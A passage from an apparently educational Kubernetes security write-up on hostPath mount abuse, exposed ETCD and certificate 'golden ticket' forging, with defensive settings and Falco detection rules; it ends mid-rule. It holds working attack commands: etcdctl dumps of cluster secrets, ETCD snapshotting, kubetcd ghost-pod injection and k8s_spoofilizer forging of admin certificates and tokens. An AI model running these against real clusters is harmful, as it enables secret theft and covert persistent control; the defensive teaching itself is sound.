+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>  
+<span class="na">metadata</span><span class="pi">:</span>  
+  <span class="na">name</span><span class="pi">:</span> <span class="s">hostpath-log-demo</span>  
+<span class="na">spec</span><span class="pi">:</span>  
+  <span class="na">containers</span><span class="pi">:</span>    
+  <span class="pi">-</span> <span class="na">image</span><span class="pi">:</span> <span class="s">alpine</span>  
+    <span class="na">name</span><span class="pi">:</span> <span class="s">test-container</span>  
+    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">tail"</span><span class="pi">]</span>  
+    <span class="na">args</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">-f"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">/dev/null"</span><span class="pi">]</span>   
+    <span class="na">volumeMounts</span><span class="pi">:</span>  
+    <span class="pi">-</span> <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/var/log/host</span>  
+      <span class="na">name</span><span class="pi">:</span> <span class="s">test-volume</span>  
+  <span class="na">volumes</span><span class="pi">:</span>  
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">test-volume</span>  
+    <span class="na">hostPath</span><span class="pi">:</span>  
+      <span class="c1"># directory location on host  </span>
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/var/log</span>  
+      <span class="c1"># this field is optional  </span>
+      <span class="na">type</span><span class="pi">:</span> <span class="s">Directory</span>  
+</code></pre></div></div>
+<p>In this setup, the pod would have access to the host’s <code class="language-plaintext highlighter-rouge">/var/log</code> directory. Daniel Sagi (<a href="https://www.aquasec.com/blog/kubernetes-security-pod-escape-log-mounts">https://www.aquasec.com/blog/kubernetes-security-pod-escape-log-mounts</a>) describes how this can be abused. If an attacker creates a symlink between a log file and a sensitive file like /etc/shadow then the attacker now has the ability to read /etc/shadow.</p>
+
+<p>An attacker could also create a symlink to the root folder on the host and read SSH keys or other sensitive files.<br />
+<img src="/img/kubernetes/kube-images/07-wvm/04-fakelog.png" alt="image44" width="720" class="mx-auto d-block" /></p>
+
+<p>An attacker with write access to host directories could also plant SUID binaries. They could create a binary that spawns a root shell and use that to escape the container when the binary gets executed on the host either through a cron job or other means.</p>
+
+<p>Other risky mount locations are <code class="language-plaintext highlighter-rouge">/var/run/docker.sock</code>, <code class="language-plaintext highlighter-rouge">/proc</code>, <code class="language-plaintext highlighter-rouge">/dev</code>, and <code class="language-plaintext highlighter-rouge">/etc</code>.</p>
+
+<h4 id="defensive-strategies-1">Defensive Strategies</h4>
+
+<h5 id="restrict-hostpath">Restrict hostPath</h5>
+
+<p><code class="language-plaintext highlighter-rouge">hostPath</code> volumes should be avoided unless absolutely necessary. If they must be used, they should be scoped to a specific directory with <code class="language-plaintext highlighter-rouge">spec.volumes.hostpath.path</code>.</p>
+
+<p>Additionally they should be set to read only mode, although this would not prevent mount traversal attacks.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="na">volumeMounts</span><span class="pi">:</span>  
+      <span class="pi">-</span> <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/var/log/host</span>  
+        <span class="na">name</span><span class="pi">:</span> <span class="s">log-volume</span>  
+        <span class="na">readOnly</span><span class="pi">:</span> <span class="kc">true</span>  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/07-wvm/05-readonly.png" alt="image45" width="720" class="mx-auto d-block" /></p>
+
+<p>To completely restrict how a pod can interact with the host filesystem the security context can be configured:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">securityContext</span><span class="pi">:</span>  
+  <span class="na">capabilities</span><span class="pi">:</span>  
+    <span class="na">drop</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">all</span>
+</code></pre></div></div>
+
+<h4 id="writable-volume-mount-detections-in-falco">Writable Volume Mount Detections in Falco</h4>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Symlink To Host Files</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect creation of symlinks inside a container that point to sensitive host paths</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">(evt.type in (symlink, symlinkat)) and</span>
+    <span class="s">(evt.arg.target in ("/etc/shadow", "/etc/sudoers", "/etc/passwd") or </span>
+    <span class="s">evt.arg.target in ("/etc/sudoers.d", "/etc", "/var/log")) and</span>
+    <span class="s">not proc.cmdline contains "podman"</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Suspicious symlink created inside container (src=%evt.arg.path target=%evt.arg.target proc=%proc.cmdline user=%user.name file=%fd.filename linkpath=%evt.arg.linkpath process=%proc.name proc_exepath=%proc.exepath parent=%proc.pname command=%proc.cmdline terminal=%proc.tty)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1611</span><span class="pi">,</span> <span class="nv">container</span><span class="pi">,</span> <span class="nv">host-escape</span><span class="pi">,</span> <span class="nv">symlink</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Pod Using hostPath to Mount Root Filesystem</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detects creation of a pod mounting / from the host filesystem, which allows full host takeover.</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ka.target.resource = "pods" and</span>
+    <span class="s">ka.verb=create and</span>
+    <span class="s">ka.req.pod.volumes.hostpath intersects (/)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">HostPath Root Mount Detected:</span>
+    <span class="s">user=%ka.user.name pod=%ka.req.pod.containers.name namespace=%ka.target.namespace</span>
+    <span class="s">hostPath=%ka.req.pod.volumes.hostpath</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">source</span><span class="pi">:</span> <span class="s">k8s_audit</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1611</span><span class="pi">,</span> <span class="nv">hostpath</span><span class="pi">,</span> <span class="nv">privilege-escalation</span><span class="pi">,</span> <span class="nv">container-escape</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Container Accessing Mounted Host Root Filesystem</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detects a container reading or writing files inside a hostPath-mounted root filesystem.</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">(container.id != host) and</span>
+    <span class="s">evt.type in (open, openat, openat2) and</span>
+    <span class="s">k8s.ns.name != "falco" and</span>
+    <span class="s">not k8s.pod.name contains "falco" and</span>
+    <span class="s">fd.name startswith "/host"</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Suspicious access to host root filesystem.</span>
+    <span class="s">container=%container.name image=%container.image.fullpath</span>
+    <span class="s">user=%user.name file=%fd.name</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">CRITICAL</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">T1611</span><span class="pi">,</span> <span class="nv">hostpath</span><span class="pi">,</span> <span class="nv">escape</span><span class="pi">,</span> <span class="nv">privilege-escalation</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<h3 id="etcd-unauthorized-access"><strong>ETCD Unauthorized Access</strong></h3>
+
+<p><code class="language-plaintext highlighter-rouge">ETCD</code> is one of the most sensitive components in the entire cluster. It stores the complete cluster state including all secrets, ConfigMaps, service account tokens, RBAC policies, pod specs, and network policies. Essentially if an attacker gets access to the <code class="language-plaintext highlighter-rouge">ETCD</code>, they have complete control over the cluster.</p>
+
+<p>By default, <code class="language-plaintext highlighter-rouge">ETCD</code> listens on port 2379 on the host’s network interface and requires client certificate authentication.  If that interface isn’t properly secured, <code class="language-plaintext highlighter-rouge">`ETCD`</code> could be reachable to attackers on the network. A quick query on shodan reveals that there are about 4.7k publicly exposed <code class="language-plaintext highlighter-rouge">ETCD</code> endpoints in the wild as of the time of writing.</p>
+
+<p><a href="https://www.shodan.io/search?query=etcd"><code class="language-plaintext highlighter-rouge">https://www.shodan.io/search?query=etcd</code></a></p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/01-etcdshodan.png" alt="image46" width="720" class="mx-auto d-block" /></p>
+
+<p>When client certificate authentication is not enforced, an actor can connect to <code class="language-plaintext highlighter-rouge">ETCD</code> and perform operations. Unlike API server misconfigurations that may be limited by RBAC, direct <code class="language-plaintext highlighter-rouge">ETCD</code> access bypasses all Kubernetes authorization controls. The attacker operates at the persistence layer, beneath the API server’s protective mechanisms.</p>
+
+<h4 id="unauthorized-data-access">Unauthorized Data Access</h4>
+
+<p>If <code class="language-plaintext highlighter-rouge">ETCD</code> is exposed then an attacker could attempt to dump the entire cluster state from <code class="language-plaintext highlighter-rouge">ETCD</code> (https://rootedsec.io/pages/posts/08-04-24/hacking-etcd.html):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">ETCDCTL_ENDPOINTS</span><span class="o">=</span><span class="s2">"https://</span><span class="nv">$EXPOSED_IP</span><span class="s2">:12379"</span> <span class="se">\ </span> 
+<span class="o">&amp;&amp;</span> <span class="nb">export </span><span class="nv">ETCDCTL_API</span><span class="o">=</span>3 <span class="se">\ </span> 
+<span class="o">&amp;&amp;</span> etcdctl get <span class="nt">--prefix</span> <span class="s2">""</span>  
+</code></pre></div></div>
+
+<p>This command would attempt to read all keys under the root prefix. If it succeeds, the <code class="language-plaintext highlighter-rouge">ETCD</code> database is accessible.</p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/02-getprefixkeys.png" alt="image47" width="720" class="mx-auto d-block" /></p>
+
+<p>For example, attackers could even extract secrets from <code class="language-plaintext highlighter-rouge">ETCD</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>etcdctl get /registry/secrets <span class="nt">--prefix</span> <span class="nt">--keys-only</span>  
+etcdctl get /registry/secrets/default/my-db-credentials  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/08-etcd/03-getsecretkey.png" alt="image48" width="720" class="mx-auto d-block" /></p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/04-plaintextsecret.png" alt="image49" width="720" class="mx-auto d-block" /></p>
+
+<p>Attackers could also create a snapshot of <code class="language-plaintext highlighter-rouge">ETCD</code> to minimize their network traffic and exfiltrate data:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>etcdctl snapshot save snapshot.db  
+</code></pre></div></div>
+
+<h4 id="injecting-malicious-configurations">Injecting Malicious Configurations</h4>
+
+<p><code class="language-plaintext highlighter-rouge">ETCD</code>’s API can also be used to write new keys or modify existing ones. When using kubectl, requests pass through authentication,authorization and, Admission Controllers before the request is executed. However, by using <code class="language-plaintext highlighter-rouge">ETCD</code> directly, these controls are completely bypassed. This means with the proper access, an attacker can create new service accounts, create a rogue pod, disable security policies, or even alter RBAC roles for privilege escalation.</p>
+
+<p>The NCC group has a proof-of-concept (PoC) for injecting resources called <code class="language-plaintext highlighter-rouge">kubetcd</code>. In their blog on compromising <code class="language-plaintext highlighter-rouge">ETCD</code>, they mention that it is also  possible to modify the creation date of a pod to evade detection.</p>
+
+<p>It is also possible to gain persistence using pods by manipulating the pod’s name and namespace. An attacker could create a pod where the name and the path do not match. Similarly, if a pod is running in a namespace that doesn’t exist, it will only appear when all resources are listed. In both cases, <code class="language-plaintext highlighter-rouge">kube-apiserver</code> will not be able to delete the pod.</p>
+
+<p><code class="language-plaintext highlighter-rouge">kubetcd</code> requires a pod to be already deployed for the Ghost Pod technique to work, so we’ll go ahead and create one.</p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/06-ghostpodcreated.png" alt="image51" width="720" class="mx-auto d-block" /></p>
+
+<p>We can then create our ghost pod:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./kubetcd create pod ghostpod-attacker <span class="nt">-t</span> ghostpod –fake-ns <span class="nt">-n</span> ghost  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/07-ghostpodinject.png" alt="image52" width="720" class="mx-auto d-block" /></p>
+
+<p>We can see that <code class="language-plaintext highlighter-rouge">kubectl</code> shows the malicious pod running in the default namespace:</p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/08-ghostpodtestget.png" alt="image53" width="720" class="mx-auto d-block" /></p>
+
+<p>However, the fake namespace doesn’t appear:</p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/09-nofakens.png" alt="image54" width="720" class="mx-auto d-block" /></p>
+
+<p>Meaning our attempts to delete the pod or the namespace will always fail.<br />
+<img src="/img/kubernetes/kube-images/08-etcd/10-ghostpoddeletetest.png" alt="image55" width="720" class="mx-auto d-block" /></p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/11-namespacenotfound.png" alt="image56" width="720" class="mx-auto d-block" /></p>
+
+<p>Now lets take a look within <code class="language-plaintext highlighter-rouge">`ETCD`</code> directly.</p>
+
+<p>In the default namespace, we no longer see the malicious pod: <br />
+<img src="/img/kubernetes/kube-images/08-etcd/12-ghostpodetcd.png" alt="image57" width="720" class="mx-auto d-block" /></p>
+
+<p>But if we look in namespaces, we don’t see the malicious namespace either:<br />
+<img src="/img/kubernetes/kube-images/08-etcd/13-etcdnofakens.png" alt="image58" width="720" class="mx-auto d-block" /></p>
+
+<p>We can find the malicious pod when we list all pods:</p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/14-ghostpodallpods.png" alt="image59" width="720" class="mx-auto d-block" /></p>
+
+<p>And only from directly through <code class="language-plaintext highlighter-rouge">`ETCD`</code> can we delete the pod:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>etcdctl del /registry/pods/ghost/ghostpod-attacker
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/15-ghostpoddel.png" alt="image60" width="720" class="mx-auto d-block" /></p>
+
+<h4 id="etcd-unauthorized-access-defensive-strategies">ETCD Unauthorized Access Defensive Strategies</h4>
+
+<h5 id="enable-client-certificate-authentication">Enable Client Certificate Authentication</h5>
+
+<p>Client certificate authentication ensures that only components with valid and trusted certificates can connect to <code class="language-plaintext highlighter-rouge">ETCD</code>.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">--data-dir=${SNAP_COMMON}/var/run/etcd</span>  
+<span class="s">--advertise-client-urls=https://${DEFAULT_INTERFACE_IP_ADDR}:12379</span>  
+<span class="s">--listen-client-urls=https://${DEFAULT_INTERFACE_IP_ADDR}:12379</span>  
+<span class="s">--client-cert-auth</span>  
+<span class="s">--trusted-ca-file=${SNAP_DATA}/certs/ca.crt</span>  
+<span class="s">--cert-file=${SNAP_DATA}/certs/server.crt</span>  
+<span class="s">--key-file=${SNAP_DATA}/certs/server.key</span>  
+<span class="s">--enable-v2=true</span>  
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">--client-cert-auth</code> ensures that all connections must present a valid certificate signed by the certificate authority. <code class="language-plaintext highlighter-rouge">--peer-client-cert-auth</code> applies the same logic to communication between <code class="language-plaintext highlighter-rouge">ETCD</code> cluster members.</p>
+
+<h5 id="network-restrictions">Network Restrictions</h5>
+
+<p><code class="language-plaintext highlighter-rouge">ETCD</code> should never be externally exposed as only the API Server and <code class="language-plaintext highlighter-rouge">ETCD</code> peers need to be able to communicate with it. It should only listen on localhost defined by <code class="language-plaintext highlighter-rouge">--listen-client-urls</code>.</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">ETCD</code> must listen on a non-localhost interface, the listener should be tightly restricted with host-level and network-level firewall rules.</p>
+
+<p>A Container Network Interface (CNI) plugin can also be used to enforce network policies. A network policy can be implemented that denies all traffic to <code class="language-plaintext highlighter-rouge">ETCD</code> except from the API server.</p>
+
+<h5 id="enable-encryption-at-rest">Enable Encryption at Rest</h5>
+
+<p><code class="language-plaintext highlighter-rouge">ETCD</code> stores secrets in plaintext by default, allowing anyone with filesystem access to read all cluster secrets.  In order to enable encryption, you need to explicitly create an EncryptionConfiguration file that will define how resources should be encrypted.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">apiserver.config.k8s.io/v1</span>  
+<span class="na">kind</span><span class="pi">:</span> <span class="s">EncryptionConfiguration</span>  
+<span class="na">resources</span><span class="pi">:</span>  
+  <span class="pi">-</span> <span class="na">resources</span><span class="pi">:</span>  
+      <span class="pi">-</span> <span class="s">secrets</span>  
+    <span class="na">providers</span><span class="pi">:</span>  
+      <span class="pi">-</span> <span class="na">aescbc</span><span class="pi">:</span>  
+          <span class="na">keys</span><span class="pi">:</span>  
+            <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">key1</span>  
+              <span class="na">secret</span><span class="pi">:</span> <span class="s">$(head -c 32 /dev/urandom | base64)</span>  
+      <span class="pi">-</span> <span class="na">identity</span><span class="pi">:</span> <span class="pi">{}</span>  
+</code></pre></div></div>
+<p>Then set <code class="language-plaintext highlighter-rouge">--encryption-provider-config</code> on the API server to point to this config file.</p>
+
+<p>The API server will now encrypt all new secrets. To re-encrypt existing secrets run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get secrets <span class="nt">-A</span>  <span class="nt">-o</span> json | kubectl replace <span class="nt">-f</span> -  
+</code></pre></div></div>
+<p><img src="/img/kubernetes/kube-images/08-etcd/16-replacesecret.png" alt="image61" width="720" class="mx-auto d-block" /></p>
+
+<p>Then the data is encrypted as shown below:</p>
+
+<p><img src="/img/kubernetes/kube-images/08-etcd/17-encryptedsecret.png" alt="image62" width="720" class="mx-auto d-block" /></p>
+
+<h4 id="etcd-detections-with-falco">ETCD Detections with Falco</h4>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">ETCD Access</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect any process accessing etcd client port</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type=connect and</span>
+    <span class="s">fd.sport=12379 and </span>
+    <span class="s">not proc.name in (kube-apiserver, kubelite, etcd)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="s">Unexpected etcd connection from %proc.name (%fd.cip:%fd.cport)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">NOTICE</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">etcd</span><span class="pi">,</span> <span class="nv">discovery</span><span class="pi">,</span> <span class="nv">T1613</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">ETCD Pod Tampering</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detects attempts to create, delete, or modify pod objects in etcd using etcdctl</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type=execve and</span>
+    <span class="s">proc.name=etcdctl and</span>
+    <span class="s">(</span>
+      <span class="s">proc.cmdline contains "put" or</span>
+      <span class="s">proc.cmdline contains "del"</span>
+    <span class="s">) and</span>
+    <span class="s">(</span>
+      <span class="s">proc.args contains "/registry/pods" or</span>
+      <span class="s">proc.cmdline contains "/registry/pods"</span>
+    <span class="s">)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Pod injection attempt via etcdctl detected</span>
+    <span class="s">(user=%user.name cmd=%proc.cmdline pid=%proc.pid file=%proc.exe) </span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">CRITICAL</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">persistence</span><span class="pi">,</span> <span class="nv">etcd</span><span class="pi">,</span> <span class="nv">api-bypass</span><span class="pi">,</span> <span class="nv">T1525</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">ETCD read attempt from unusual source detected</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detects attemtps to read sensitive information from etcd</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type=execve and</span>
+    <span class="s">proc.name=etcdctl and </span>
+    <span class="s">(</span>
+      <span class="s">proc.args contains "get" or</span>
+      <span class="s">proc.cmdline contains "get"</span>
+    <span class="s">) and</span>
+    <span class="s">(</span>
+      <span class="s">proc.cmdline contains "/registry/pods" or </span>
+      <span class="s">proc.cmdline contains "/registry/secrets" or </span>
+      <span class="s">proc.cmdline contains "/registry/configmaps"</span>
+    <span class="s">)</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ETCD read attempt detected (user=%user.name cmd=%proc.cmdline pid=%proc.pid file=%proc.exe)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">WARNING</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">etcd</span><span class="pi">,</span> <span class="nv">control-plane</span><span class="pi">,</span> <span class="nv">T1525</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">ETCD Snapshot Created</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect creation of ETCD snapshots, which may indicate cluster state exfiltration</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type = execve and</span>
+    <span class="s">proc.name = "etcdctl" and</span>
+    <span class="s">proc.cmdline contains "snapshot" and</span>
+    <span class="s">proc.cmdline contains "save"</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">ETCD snapshot created (proc=%proc.cmdline user=%user.name)</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">CRITICAL</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">etcd</span><span class="pi">,</span> <span class="nv">exfiltration</span><span class="pi">,</span> <span class="nv">discovery</span><span class="pi">,</span> <span class="nv">credential-access</span><span class="pi">,</span> <span class="nv">T1613</span><span class="pi">]</span>
+
+<span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">ETCD Registry Deletion</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect deletion of Kubernetes objects directly from etcd</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type = execve and</span>
+    <span class="s">proc.name = etcdctl and</span>
+    <span class="s">proc.cmdline contains "del" and</span>
+    <span class="s">proc.cmdline contains "/registry/"</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">Direct deletion of Kubernetes objects from etcd |</span>
+    <span class="s">cmd=%proc.cmdline user=%user.name</span>
+  <span class="na">priority</span><span class="pi">:</span> <span class="s">CRITICAL</span>
+  <span class="na">tags</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">etcd</span><span class="pi">,</span> <span class="nv">defense-evasion</span><span class="pi">,</span> <span class="nv">T1485</span><span class="pi">]</span>
+</code></pre></div></div>
+
+<h3 id="kubernetes-golden-ticket"><strong>Kubernetes Golden Ticket</strong></h3>
+
+<h4 id="understanding-certificate-authorities">Understanding Certificate Authorities</h4>
+
+<p>There are a few internal Kubernetes authentication methods, including static token authentication, bootstrap tokens, service account tokens, X.509 client certificates.  Certificate authentication is usually specifically used when the kubelet authenticates to the API server but it can also be used for user authentication.</p>
+
+<p>This technique only applies to unmanaged clusters. For cloud vendors that offer managed Kubernetes as a service, they are responsible for handling certificates and don’t expose them to users.</p>
+
+<p>A Certificate Authority (CA) issues cryptographic certificates that prove the identity of various components or users. Each certificate has key identity fields: the Common Name (CN) which represents the user, The Organization (O) indicates the user’s group, and the Issuer shows who signed the certificate. When the API server receives a certificate signed by its trusted CA, it uses these fields to determine the identity and permissions of the client.</p>
+
+<p><img src="/img/kubernetes/kube-images/09-goldenticket/01-Certificate.png" alt="image63" width="720" class="mx-auto d-block" /></p>
+
+<p>Kubernetes keeps the CA in plaintext on the control-plane node’s filesystem under <code class="language-plaintext highlighter-rouge">/etc/kubernetes/pki</code> or for <code class="language-plaintext highlighter-rouge">microk8s</code> in <code class="language-plaintext highlighter-rouge">/var/snap/microk8s/current/certs</code>.</p>
+
+<p><img src="/img/kubernetes/kube-images/09-goldenticket/02-cadir.png" alt="image64" width="720" class="mx-auto d-block" /></p>
+
+<p>The primary cluster CA signs the certificates used by various components in Kubernetes and also can sign the certificates for user authentication.</p>
+
+<p>When you present a client certificate to the API server, the server will check if it’s signed by the trusted CA. If it is, Kubernetes accepts the identity claims in that certificate without further authentication.</p>
+
+<h4 id="golden-ticket">Golden Ticket</h4>
+
+<p>The phrase “Golden Ticket” refers to the post-exploitation technique in Active Directory where an attacker is able to forge valid Kerberos tickets to gain domain admin privileges.</p>
+
+<p>In Kubernetes, the Golden Ticket technique refers to a technique where an attacker compromises the CA’s signing key and the service account signing key and uses it to forge their own credentials. This technique, first written about by Datadog researcher Rory McCune (<a href="https://raesene.github.io/blog/2019/04/16/kubernetes-certificate-auth-golden-key/">https://raesene.github.io/blog/2019/04/16/kubernetes-certificate-auth-golden-key/</a>), was later built upon by Joseph Testa, who released <code class="language-plaintext highlighter-rouge">k8s_spoofilizer</code>(<a href="https://www.positronsecurity.com/blog/2025-02-26-kubernetes-golden-tickets/">https://www.positronsecurity.com/blog/2025-02-26-kubernetes-golden-tickets/</a>), a tool to create ServiceAccount tokens and administrative user certificates.</p>
+
+<p>The required files for this are the <code class="language-plaintext highlighter-rouge">ca.crt</code>, <code class="language-plaintext highlighter-rouge">ca.key</code>, <code class="language-plaintext highlighter-rouge">sa.key</code> files. Once these files are found and you have the IP of the API server, impersonation is possible via the following command:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./k8s_spoofilizer.py <span class="nt">--server</span> https://<span class="nv">$APISERVER</span>:6443/ <span class="nt">--update-uid-cache</span> ./key_dir/   
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/09-goldenticket/05-spoofadm.png" alt="image67" width="720" class="mx-auto d-block" /></p>
+
+<p><img src="/img/kubernetes/kube-images/09-goldenticket/03-kubeadmin.png" alt="image66" width="720" class="mx-auto d-block" /></p>
+
+<p>After this, an attacker could generate an administrative account and sign it with the stolen key. Kubernetes doesn’t throw any errors if there’s another certificate with that identity, allowing stealthy persistence. In essence, if an attacker is able to steal certificate keys, they gain the ability to impersonate any user, service account, or node.</p>
+
+<p>In the same vein, with a stolen <code class="language-plaintext highlighter-rouge">serviceaccount.key</code> which signs service account JWT tokens, an attacker can forge service account tokens for any service account in any namespace. They can even create long-lived tokens, making it an additional efficient form of persistence.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 k8s_spoofilizer.py <span class="nt">--forge-sa-token</span> default/test-user key_dir/  
+</code></pre></div></div>
+
+<p><img src="/img/kubernetes/kube-images/09-goldenticket/06-testusercreate.png" alt="image69" width="720" class="mx-auto d-block" /></p>
+
+<p><img src="/img/kubernetes/kube-images/09-goldenticket/05-spoofadm" alt="image68" width="720" class="mx-auto d-block" /></p>
+
+<p>Kubernetes node certificates can also be forged. Any node name can be specified, including  a non-existent one.Kubernetes will treat non-existing node names  as a valid node identity.</p>
+
+<p>Kubernetes also has no ability for certificate revocation, meaning the only guaranteed way to eject an attacker who has stolen the certificate keys is to replace the cluster’s CA and re-issue all certificates.</p>
+
+<h4 id="golden-ticket-defensive-strategies">Golden Ticket Defensive Strategies</h4>
+
+<h5 id="protect-the-ca-private-key">Protect the CA Private Key</h5>
+
+<p>The CA key file should be restricted on an operating system level. This means using file system permissions to limit who can read it,  typically only the root user or the Kubernetes process should have access. Avoid situations where non-control-plane containers or users can ever read certificate files.</p>
+
+<h5 id="certificate-rotation">Certificate Rotation</h5>
+
+<p>By default, the Kubernetes CA has a long validity time of 10 years and certificates can last for even a year. Rotating the CA certificate can cause disruptions within the cluster especially in complex environments.</p>
+
+<p>Before attempting rotation, create a backup of the certificate directory and important configuration files.</p>
+
+<h4 id="golden-ticket-detections">Golden Ticket Detections</h4>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">rule</span><span class="pi">:</span> <span class="s">Read of Kubernetes CA Key</span>
+  <span class="na">desc</span><span class="pi">:</span> <span class="s">Detect any process reading the Kubernetes CA private key</span>
+  <span class="na">condition</span><span class="pi">:</span> <span class="pi">&gt;</span>
+    <span class="s">evt.type in (open,openat,openat2) and </span>
+    <span class="s">fd.name in (/etc/kubernetes/pki/ca.key, /etc/kubernetes/pki/sa.key, /var/snap/microk8s/current/certs/ca.key, /var/snap/microk8s/current/certs/serviceaccount.key) and </span>
+    <span class="s">not (proc.name in (kube-apiserver, etcd, microk8s.daemon-kubelite, systemd))</span>
+  <span class="na">output</span><span class="pi">:</span> <span class="pi">&gt;</span>
